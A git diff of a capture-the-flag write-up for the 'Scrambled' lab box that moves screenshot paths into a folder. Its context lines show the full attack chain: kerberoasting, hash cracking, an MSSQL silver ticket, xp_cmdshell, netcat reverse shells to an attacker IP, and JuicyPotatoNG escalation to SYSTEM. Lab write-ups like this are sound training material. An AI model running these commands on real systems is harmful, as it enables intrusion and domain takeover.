@@ -45,7 +45,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.11.205
 ```
 
-![ping](scrambled_01_ping.png)
+![ping](screenshots/scrambled_01_ping.png)
 
 ---
 
@@ -64,7 +64,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.11.205 -oG allPorts
 - `-Pn` : Skip host discovery (treat host as up)  
 - `-oG` : Output in grepable format (useful for parsing)  
 
-![nmap all ports](scrambled_02_nmap_allports.png)
+![nmap all ports](screenshots/scrambled_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -72,7 +72,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractPorts](scrambled_03_extractports.png)
+![extractPorts](screenshots/scrambled_03_extractports.png)
 Extracted open ports from your run:
 
 - `53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3268, 3269, 4411, 5985, 9389, 49667, 49673, 49674, 49716, 49720`
@@ -92,7 +92,7 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![nmap targeted](scrambled_04_nmap_targeted.png)
+![nmap targeted](screenshots/scrambled_04_nmap_targeted.png)
 
 **Findings (high level):**
 
@@ -124,7 +124,7 @@ smbclient -L //10.129.11.205 -N
 rpcclient -U '' -N 10.129.11.205
 ```
 
-![enum no useful results](scrambled_05_smb_rpc_no_useful_results.png)
+![enum no useful results](screenshots/scrambled_05_smb_rpc_no_useful_results.png)
 
 ---
 
@@ -138,7 +138,7 @@ ldapsearch -x -H ldap://10.129.11.205 -s base namingcontexts
 ldapsearch -x -H ldap://10.129.11.205 -b 'DC=scrm,DC=local'
 ```
 
-![ldap naming contexts](scrambled_06_ldap_namingcontexts.png)
+![ldap naming contexts](screenshots/scrambled_06_ldap_namingcontexts.png)
 
 
 ---
@@ -154,15 +154,15 @@ Browse the intranet site:
 firefox http://10.129.11.205/
 ```
 
-![ntlm disabled](scrambled_07_website.png)
+![ntlm disabled](screenshots/scrambled_07_website.png)
 
 The websiteâ€™s IT services messaging indicates NTLM auth is disabled, steering the run toward Kerberos.
 
-![ntlm disabled](scrambled_08_web_ntlm_disabled.png)
+![ntlm disabled](screenshots/scrambled_08_web_ntlm_disabled.png)
 
 From â€œContact ITâ€ in the web UI, a username is revealed:
 
-![contact it user](scrambled_09_contact_it_user.png)
+![contact it user](screenshots/scrambled_09_contact_it_user.png)
 
 ---
 
@@ -175,7 +175,7 @@ This avoids wasting time on invalid accounts.
 kerbrute userenum --dc 10.129.11.205 -d scrm.local users
 ```
 
-![kerbrute userenum](scrambled_10_kerbrute_userenum.png)
+![kerbrute userenum](screenshots/scrambled_10_kerbrute_userenum.png)
 
 ---
 
@@ -193,8 +193,8 @@ First, try the â€œpassword == usernameâ€ pattern suggested by the IT po
 impacket-smbclient -k scrm.local/ksimpson:ksimpson@DC1.scrm.local
 ```
 
-![GetUserSPNs same-password try](scrambled_11_getuserspns_initial_try.png)
-![impacket smbclient public](scrambled_12_smbclient_public_share_access.png)
+![GetUserSPNs same-password try](screenshots/scrambled_11_getuserspns_initial_try.png)
+![impacket smbclient public](screenshots/scrambled_12_smbclient_public_share_access.png)
 
 Download the PDF from the `Public` share and extract its text (quickly searchable in terminal):
 
@@ -202,7 +202,7 @@ Download the PDF from the `Public` share and extract its text (quickly searchabl
 pdftotext "Network Security Changes.pdf" -
 ```
 
-![pdf sql creds hint](scrambled_13_pdf_sql_credentials_hint.png)
+![pdf sql creds hint](screenshots/scrambled_13_pdf_sql_credentials_hint.png)
 
 With a valid domain user, we can request service tickets for accounts that have an SPN set (kerberoasting).
 The goal is to obtain a crackable hash for a service account and recover a usable password.
@@ -211,7 +211,7 @@ The goal is to obtain a crackable hash for a service account and recover a usabl
 impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local -dc-ip 10.129.11.205 -request
 ```
 
-![kerberos request/ticket setup](scrambled_14_kerberos_request_ticket_setup.png)
+![kerberos request/ticket setup](screenshots/scrambled_14_kerberos_request_ticket_setup.png)
 
 ```bash
 echo '<HASH>' > hash_sqlsvc
@@ -220,7 +220,7 @@ john -w:/usr/share/wordlists/rockyou.txt hash_sqlsvc
 
 Crack the hash offline to recover the cleartext password:
 
-![john crack result](scrambled_15_john_crack_result.png)
+![john crack result](screenshots/scrambled_15_john_crack_result.png)
 
 Password: `Pegasus60`
 
@@ -243,7 +243,7 @@ export KRB5_CONFIG=sqlsvc.ccache
 impacket-mssqlclient dc1.scrm.local -k
 ```
 
-![TGT Blocked](scrambled_16_tgt_blocked.png)
+![TGT Blocked](screenshots/scrambled_16_tgt_blocked.png)
 
 To perform a **Silver Ticket** against MSSQL we need:
 
@@ -253,13 +253,13 @@ To perform a **Silver Ticket** against MSSQL we need:
 
 Convert the cracked password to an NTLM hash (any offline method is fine; a web generator was used in this run):
 
-![NTLM hash|624](scrambled_17_ntlm_hash_generator.png)
+![NTLM hash|624](screenshots/scrambled_17_ntlm_hash_generator.png)
 
-![NTLM hash|624](scrambled_18_hash_ntlm.png)
+![NTLM hash|624](screenshots/scrambled_18_hash_ntlm.png)
 
 Retrieve the domain SID (captured here via `getPac.py`):
 
-![NTLM hash|624](scrambled_19_domainSID_admin.png)
+![NTLM hash|624](screenshots/scrambled_19_domainSID_admin.png)
 
 Forge a service ticket for MSSQL as `Administrator`, then connect using Kerberos:
 
@@ -281,7 +281,7 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
 
-![mssql silver ticket success](scrambled_22_mssql_silver_ticket_success.png)
+![mssql silver ticket success](screenshots/scrambled_22_mssql_silver_ticket_success.png)
 
 From there, enable command execution and stage a reverse shell helper (this run uses `nc.exe` staged to `C:\Temp\netcat.exe`):
 
@@ -289,7 +289,7 @@ From there, enable command execution and stage a reverse shell helper (this run 
 xp_cmdshell "C:\Temp\netcat.exe -e cmd 10.10.15.206 443"
 ```
 
-![payload](scrambled_23_netcat.png)
+![payload](screenshots/scrambled_23_netcat.png)
 
 Validate access / start enumerating for flags:
 
@@ -297,7 +297,7 @@ Validate access / start enumerating for flags:
 xp_cmdshell "dir /r /s user.txt"
 ```
 
-![Not flags found](scrambled_24_no_flags_found.png)
+![Not flags found](screenshots/scrambled_24_no_flags_found.png)
 
 Let's upload JuicyPotatoNG to sqlsvc machine with python server as before we did it with netcat. I rename the file to privesc.exe and I created the folder privesc in C:/Temp, after that I execute the next command meanshile I have rlwrap listening in port 443:
 
@@ -305,7 +305,7 @@ Let's upload JuicyPotatoNG to sqlsvc machine with python server as before we did
 .\privesc.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\netcat.exe -e cmd 10.10.15.206 443"
 ```
 
-![nt authority system logged](scrambled_25_privesc_executed.png)
+![nt authority system logged](screenshots/scrambled_25_privesc_executed.png)
 
 ---
 
@@ -318,7 +318,7 @@ xp_cmdshell "dir /r /s user.txt"
 xp_cmdshell "dir /r /s root.txt"
 ```
 
-![nt authority system logged](scrambled_26_user_root_flags.png)
+![nt authority system logged](screenshots/scrambled_26_user_root_flags.png)
 
 ðŸ **User flag obtained**
 ðŸ **Root flag obtained**
